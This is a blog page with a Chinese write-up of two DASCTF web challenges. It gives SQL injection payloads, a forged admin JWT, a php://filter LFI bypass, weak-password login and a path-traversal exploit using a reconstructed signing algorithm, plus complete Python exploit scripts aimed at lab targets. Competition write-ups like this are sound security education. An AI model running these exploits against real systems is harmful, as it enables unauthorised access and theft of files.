

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">

  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412222328446.jpg">
  

  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="XU17">
  <meta name="keywords" content="">
  
    <meta name="description" content="DASCTF下半年赛WriteUp">
<meta property="og:type" content="article">
<meta property="og:title" content="DASCTF下半年赛WriteUp">
<meta property="og:url" content="https://xu17.top/2025/12/07/DASCTF2025/index.html">
<meta property="og:site_name" content="XU17">
<meta property="og:description" content="DASCTF下半年赛WriteUp">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202512072045217.png">
<meta property="article:published_time" content="2025-12-07T09:20:00.000Z">
<meta property="article:modified_time" content="2025-12-07T12:48:47.611Z">
<meta property="article:author" content="XU17">
<meta property="article:tag" content="CTF">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202512072045217.png">
  
  
  
  <title>DASCTF下半年赛WriteUp - XU17</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">



<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"xu17.top","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":true,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"Hh0qQAnE7Hsu4FeGu84fiWVS-gzGzoHsz","app_key":"wRTMLUJSKcLNxEGBSEvSGJ4x","server_url":"https://hh0qqane.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  

  

  

  

  

  
    
  



  
<meta name="generator" content="Hexo 7.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>XU17&#39;s Blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/" target="_self">
                <i class="iconfont icon-link-fill"></i>
                <span>友链</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202512072045217.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="DASCTF下半年赛WriteUp"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2025-12-07 17:20" pubdate>
          2025年12月7日 下午
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          6.7k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          57 分钟
        
      </span>
    

    
    
      
        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="leancloud-page-views"></span> 次
        </span>
        
      
      
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">DASCTF下半年赛WriteUp</h1>
            
            
              <div class="markdown-body">
                
                <p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202512072045217.png" srcset="/img/loading.gif" lazyload alt="image-20251207204559084"></p>
<h1 id="DASCTF下半年赛WriteUp"><a href="#DASCTF下半年赛WriteUp" class="headerlink" title="DASCTF下半年赛WriteUp"></a>DASCTF下半年赛WriteUp</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Gallery"><a href="#Gallery" class="headerlink" title="Gallery"></a>Gallery</h3><p>题目描述</p>
<blockquote>
<p>一个图片画廊网站</p>
</blockquote>
<p>解题过程</p>
<p><strong>信息收集</strong></p>
<p>访问网站发现是一个图片画廊应用，存在登录功能。</p>
<p>观察请求发现：</p>
<ul>
<li>使用 JWT 进行身份认证（Cookie: <code>auth_token</code>）</li>
<li>后端使用 PHP + SQLite</li>
</ul>
<p><strong>SQL</strong> <strong>注入获取</strong> <strong>JWT</strong> <strong>Secret</strong></p>
<p>在登录&#x2F;搜索功能处发现 SQLite 注入漏洞。</p>
<p><strong>注入点测试</strong>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Bash"><span class="hljs-string">&#x27; OR 1=1--</span><br></code></pre></td></tr></table></figure>

<p>发现报错</p>
<p>再尝试，成功登录</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs Bash">用户名: <span class="hljs-string">&#x27; UNION SELECT 1,group_concat(sql),3 FROM sqlite_master--</span><br><span class="hljs-string">密码: x</span><br></code></pre></td></tr></table></figure>

<p>发现关键线索</p>
<p>页面中隐藏了重要信息。</p>
<p>看每张图片的 Photo ID 的首字母&#x2F;首字符：</p>
<table>
<thead>
<tr>
<th>Photo</th>
<th>ID</th>
<th>首字符</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>G1001</td>
<td>G</td>
</tr>
<tr>
<td>2</td>
<td>A2002</td>
<td>A</td>
</tr>
<tr>
<td>3</td>
<td>L3003</td>
<td>L</td>
</tr>
<tr>
<td>4</td>
<td>L4004</td>
<td>L</td>
</tr>
<tr>
<td>5</td>
<td>E5005</td>
<td>E</td>
</tr>
<tr>
<td>6</td>
<td>R6006</td>
<td>R</td>
</tr>
<tr>
<td>7</td>
<td>Y7007</td>
<td>Y</td>
</tr>
<tr>
<td>8</td>
<td>28008</td>
<td>2</td>
</tr>
<tr>
<td>9</td>
<td>9009</td>
<td>0</td>
</tr>
<tr>
<td>10</td>
<td>210010</td>
<td>2</td>
</tr>
<tr>
<td>11</td>
<td>411011</td>
<td>4</td>
</tr>
<tr>
<td>12</td>
<td>S12012</td>
<td>S</td>
</tr>
<tr>
<td>13</td>
<td>E13013</td>
<td>E</td>
</tr>
<tr>
<td>14</td>
<td>C14014</td>
<td>C</td>
</tr>
<tr>
<td>15</td>
<td>R15015</td>
<td>R</td>
</tr>
<tr>
<td>16</td>
<td>E16016</td>
<td>E</td>
</tr>
<tr>
<td>17</td>
<td>T17017</td>
<td>T</td>
</tr>
</tbody></table>
<p>拼起来是：<code>GALLERY2024SECRET</code></p>
<p><strong>获取到 JWT Secret</strong>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Bash">GALLERY2024SECRET<br></code></pre></td></tr></table></figure>

<p><strong>JWT 伪造</strong></p>
<p>使用获取的 secret 伪造 admin 用户的 JWT：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs Bash">import jwt<br><br>secret = <span class="hljs-string">&quot;GALLERY2024SECRET&quot;</span><br>payload = &#123;<br>    <span class="hljs-string">&quot;user&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>,<br>    <span class="hljs-string">&quot;role&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>,<br>    <span class="hljs-string">&quot;iat&quot;</span>: 1764993717<br>&#125;<br><br>token = jwt.encode(payload, secret, algorithm=<span class="hljs-string">&quot;HS256&quot;</span>)<br><span class="hljs-built_in">print</span>(token)<br></code></pre></td></tr></table></figure>

<p><strong>生成的 JWT</strong>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Bash">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3NjQ5OTM3MTd9.sUQ1YYVZIqqkcz7Nx62dHj-R-8UQi6ubiCcVwkCmT_I<br></code></pre></td></tr></table></figure>

<p>访问 Admin 页面</p>
<p>使用伪造的 JWT 设置 Cookie 后访问 <code>/admin.php</code>，发现文件导出功能：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Bash">action=<span class="hljs-built_in">export</span>&amp;filepath=xxx<br></code></pre></td></tr></table></figure>

<p><strong>LFI 读取 Flag</strong></p>
<p>尝试直接读取 <code>/flag</code> 等路径失败，发现存在 base64 过滤。</p>
<p><strong>使用 iconv 编码绕过</strong>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs Bash">php://filter/read=convert.iconv.UTF-8.UTF-16LE/resource=/var/www/html/flag.php<br>import requests<br>url = <span class="hljs-string">&quot;http://target/admin.php&quot;</span><br>cookie = &#123;<br>    <span class="hljs-string">&quot;auth_token&quot;</span>: <span class="hljs-string">&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3NjQ5OTM3MTd9.sUQ1YYVZIqqkcz7Nx62dHj-R-8UQi6ubiCcVwkCmT_I&quot;</span><br>&#125;<br><br>filepath = <span class="hljs-string">&quot;php://filter/read=convert.iconv.UTF-8.UTF-16LE/resource=/var/www/html/flag.php&quot;</span><br>data = &#123;<span class="hljs-string">&quot;action&quot;</span>: <span class="hljs-string">&quot;export&quot;</span>, <span class="hljs-string">&quot;filepath&quot;</span>: filepath&#125;<br>r = requests.post(url, cookies=cookie, data=data)<br></code></pre></td></tr></table></figure>

<p>解码 UTF-16LE</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs Bash">content = r.text.split(<span class="hljs-string">&quot;&lt;!doctype&quot;</span>)[0].strip()<br>decoded = content.encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>).decode(<span class="hljs-string">&#x27;utf-16-le&#x27;</span>, errors=<span class="hljs-string">&#x27;ignore&#x27;</span>)<br><span class="hljs-built_in">print</span>(decoded)<br></code></pre></td></tr></table></figure>

<p><strong>读取到 flag.php 源码</strong>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs Bash">&lt;?php<br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&quot;DASCTF&#123;xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx&#125;&quot;</span>;<br>?&gt;<br></code></pre></td></tr></table></figure>

<p>完整 EXP</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://target/admin.php&quot;</span><br>cookie = &#123;<br>    <span class="hljs-string">&quot;auth_token&quot;</span>: <span class="hljs-string">&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3NjQ5OTM3MTd9.sUQ1YYVZIqqkcz7Nx62dHj-R-8UQi6ubiCcVwkCmT_I&quot;</span><br>&#125;<br><br>filepath = <span class="hljs-string">&quot;php://filter/read=convert.iconv.UTF-8.UTF-16LE/resource=/var/www/html/flag.php&quot;</span><br>data = &#123;<span class="hljs-string">&quot;action&quot;</span>: <span class="hljs-string">&quot;export&quot;</span>, <span class="hljs-string">&quot;filepath&quot;</span>: filepath&#125;<br>r = requests.post(url, cookies=cookie, data=data)<br><br><span class="hljs-comment"># 解码 UTF-16LE</span><br>content = r.text.split(<span class="hljs-string">&quot;&lt;!doctype&quot;</span>)[<span class="hljs-number">0</span>].strip()<br>decoded = content.encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>).decode(<span class="hljs-string">&#x27;utf-16-le&#x27;</span>, errors=<span class="hljs-string">&#x27;ignore&#x27;</span>)<br><span class="hljs-built_in">print</span>(decoded)<br></code></pre></td></tr></table></figure>

<p>解码</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs Bash">content = r.text.split(<span class="hljs-string">&quot;&lt;!doctype&quot;</span>)[0].strip()<br>decoded = content.encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>).decode(<span class="hljs-string">&#x27;utf-16-le&#x27;</span>, errors=<span class="hljs-string">&#x27;ignore&#x27;</span>)<br><span class="hljs-built_in">print</span>(decoded)<br></code></pre></td></tr></table></figure>

<p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202512070925194.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>攻击链</p>
<p>SQL注入获取JWT Secret → 伪造Admin JWT → 访问Admin页面 → LFI读取flag.php</p>
<h3 id="DevWeb"><a href="#DevWeb" class="headerlink" title="DevWeb"></a><strong>DevWeb</strong></h3><p><strong>题目描述</strong></p>
<blockquote>
<p>devweb - 这是一个正在开发中的网站</p>
</blockquote>
<p><strong>解题过程</strong></p>
<p><strong>1. 信息收集</strong></p>
<p>访问目标网站，发现是一个 Spring Boot 应用（通过 Whitelabel Error Page 识别）。</p>
<p>分析前端 JS 文件 <code>/assets/index-BgDOi0T5.js</code>，发现以下关键信息：</p>
<ol>
<li><strong>RSA 公钥</strong>（被注释掉）：</li>
</ol>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">//publicKey:&quot;MIGeMA0GCSqGSIb3DQEBAQUAA4GMADCBiAKBgGyAKgwgFtRvud51H9otkcAxKh/8/iIlj3WlPJ0RL1pDtRvyMu5/edP84Mp9FqnZNCXKi1042pd4Y2Bf9QT0/z1i6KPiZ8zT3XNTtPOqIHO5aVaOfAl8lr52AurMZVpXwEUS2hh+Q/AN4/SV9AZPCgrUXk619aaw0Md9MNvn3w0JAgMBAAE=&quot;</span><br></code></pre></td></tr></table></figure>

<ol start="2">
<li><strong>登录逻辑</strong>：密码使用 RSA 加密后 POST 到 <code>/login</code></li>
<li><strong>文件下载功能</strong>：</li>
</ol>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-title function_">downloadFile</span>(<span class="hljs-params">t</span>)&#123;<br>    <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">`/download?file=<span class="hljs-subst">$&#123;t.name&#125;</span>&amp;sign=6f742c2e79030435b7edc1d79b8678f6`</span><br>&#125;<br></code></pre></td></tr></table></figure>

<ol start="4">
<li><strong>固定文件列表</strong>：<code>app.jmx</code>和<code>index.html</code></li>
</ol>
<p><strong>2. 登录绕过</strong></p>
<p>使用提取的 RSA 公钥加密密码，尝试弱口令登录：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> Crypto.PublicKey <span class="hljs-keyword">import</span> RSA<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> PKCS1_v1_5<br><span class="hljs-keyword">import</span> base64, requests<br><br>pubkey_b64 = <span class="hljs-string">&quot;MIGeMA0GCSqGSIb3DQEBAQUAA4GMADCBiAKBgGyAKgwgFtRvud51H9otkcAxKh/8/iIlj3WlPJ0RL1pDtRvyMu5/edP84Mp9FqnZNCXKi1042pd4Y2Bf9QT0/z1i6KPiZ8zT3XNTtPOqIHO5aVaOfAl8lr52AurMZVpXwEUS2hh+Q/AN4/SV9AZPCgrUXk619aaw0Md9MNvn3w0JAgMBAAE=&quot;</span><br>key = RSA.import_key(<span class="hljs-string">f&quot;-----BEGIN PUBLIC KEY-----\n<span class="hljs-subst">&#123;pubkey_b64&#125;</span>\n-----END PUBLIC KEY-----&quot;</span>)<br>cipher = PKCS1_v1_5.new(key)<br><br><span class="hljs-comment"># 加密密码</span><br>password = <span class="hljs-string">&quot;123456&quot;</span><br>encrypted = base64.b64encode(cipher.encrypt(password.encode())).decode()<br><br><span class="hljs-comment"># 登录</span><br>session = requests.Session()<br>r = session.post(base_url + <span class="hljs-string">&quot;/login&quot;</span>,<br>    data=<span class="hljs-string">f&quot;username=admin&amp;password=<span class="hljs-subst">&#123;requests.utils.quote(encrypted)&#125;</span>&quot;</span>,<br>    headers=&#123;<span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>&#125;,<br>    allow_redirects=<span class="hljs-literal">False</span>)<br></code></pre></td></tr></table></figure>

<p><strong>成功登录</strong>：<code>admin:123456</code></p>
<p><strong>3. 分析签名算法</strong></p>
<p>下载 <code>app.jmx</code> 文件（JMeter 测试计划），发现签名生成算法：</p>
<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs Groovy"><span class="hljs-keyword">def</span> mingWen = vars.get(<span class="hljs-string">&#x27;mingWen&#x27;</span>);<br><span class="hljs-keyword">def</span> firstMi = DigestUtils.md5Hex(mingWen);<br><span class="hljs-keyword">def</span> jieStr = firstMi.substring(<span class="hljs-number">5</span>, <span class="hljs-number">16</span>);<br><span class="hljs-keyword">def</span> salt = vars.get(<span class="hljs-string">&#x27;salt&#x27;</span>);<br><span class="hljs-keyword">def</span> newStr = firstMi + jieStr + salt;<br><span class="hljs-keyword">def</span> sign = DigestUtils.md5Hex(newStr);<br></code></pre></td></tr></table></figure>

<p>同时发现 <strong>salt 值</strong>：<code>f9bc855c9df15ba7602945fb939deefc</code></p>
<p><strong>签名算法 Python 实现</strong>：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> hashlib<br><br>salt = <span class="hljs-string">&quot;f9bc855c9df15ba7602945fb939deefc&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_sign</span>(<span class="hljs-params">filename</span>):<br>    firstMi = hashlib.md5(filename.encode()).hexdigest()<br>    jieStr = firstMi[<span class="hljs-number">5</span>:<span class="hljs-number">16</span>]  <span class="hljs-comment"># 取第5-15位（共11字符）</span><br>    newStr = firstMi + jieStr + salt<br>    sign = hashlib.md5(newStr.encode()).hexdigest()<br>    <span class="hljs-keyword">return</span> sign<br></code></pre></td></tr></table></figure>

<p><strong>4. 任意文件读取</strong></p>
<p>利用签名算法，可以生成任意文件名的有效签名，结合路径穿越读取敏感文件：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-comment"># 生成 ../../../flag 的签名</span><br>filename = <span class="hljs-string">&quot;../../../flag&quot;</span><br>sign = generate_sign(filename)<br><br><span class="hljs-comment"># 请求下载</span><br>url = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;base_url&#125;</span>/download?file=<span class="hljs-subst">&#123;filename&#125;</span>&amp;sign=<span class="hljs-subst">&#123;sign&#125;</span>&quot;</span><br>r = session.get(url)<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure>

<p><strong>5. 获取 Flag</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Plain">GET /download?file=../../../flag&amp;sign=&lt;calculated_sign&gt;<br></code></pre></td></tr></table></figure>

<p><strong>Flag</strong>: <code>DASCTF&#123;2fdf78d8-5c3d-41a4-b627-12f4d24bf5bd&#125;</code></p>
<p><strong>完整 EXP</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">from</span> Crypto.PublicKey <span class="hljs-keyword">import</span> RSA<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> PKCS1_v1_5<br><span class="hljs-keyword">import</span> hashlib<br><br>base_url = <span class="hljs-string">&quot;http://target:81&quot;</span><br><br><span class="hljs-comment"># ========== 1. RSA 加密登录 ==========</span><br>pubkey_b64 = <span class="hljs-string">&quot;MIGeMA0GCSqGSIb3DQEBAQUAA4GMADCBiAKBgGyAKgwgFtRvud51H9otkcAxKh/8/iIlj3WlPJ0RL1pDtRvyMu5/edP84Mp9FqnZNCXKi1042pd4Y2Bf9QT0/z1i6KPiZ8zT3XNTtPOqIHO5aVaOfAl8lr52AurMZVpXwEUS2hh+Q/AN4/SV9AZPCgrUXk619aaw0Md9MNvn3w0JAgMBAAE=&quot;</span><br>key = RSA.import_key(<span class="hljs-string">f&quot;-----BEGIN PUBLIC KEY-----\n<span class="hljs-subst">&#123;pubkey_b64&#125;</span>\n-----END PUBLIC KEY-----&quot;</span>)<br>cipher = PKCS1_v1_5.new(key)<br>encrypted = base64.b64encode(cipher.encrypt(<span class="hljs-string">b&quot;123456&quot;</span>)).decode()<br><br>session = requests.Session()<br>session.post(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;base_url&#125;</span>/login&quot;</span>, <br>    data=<span class="hljs-string">f&quot;username=admin&amp;password=<span class="hljs-subst">&#123;requests.utils.quote(encrypted)&#125;</span>&quot;</span>,<br>    headers=&#123;<span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>&#125;,<br>    allow_redirects=<span class="hljs-literal">False</span>)<br><br><span class="hljs-comment"># ========== 2. 签名算法 ==========</span><br>salt = <span class="hljs-string">&quot;f9bc855c9df15ba7602945fb939deefc&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_sign</span>(<span class="hljs-params">filename</span>):<br>    firstMi = hashlib.md5(filename.encode()).hexdigest()<br>    jieStr = firstMi[<span class="hljs-number">5</span>:<span class="hljs-number">16</span>]<br>    newStr = firstMi + jieStr + salt<br>    <span class="hljs-keyword">return</span> hashlib.md5(newStr.encode()).hexdigest()<br><br><span class="hljs-comment"># ========== 3. 读取 Flag ==========</span><br>filename = <span class="hljs-string">&quot;../../../flag&quot;</span><br>sign = generate_sign(filename)<br>r = session.get(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;base_url&#125;</span>/download?file=<span class="hljs-subst">&#123;filename&#125;</span>&amp;sign=<span class="hljs-subst">&#123;sign&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure>

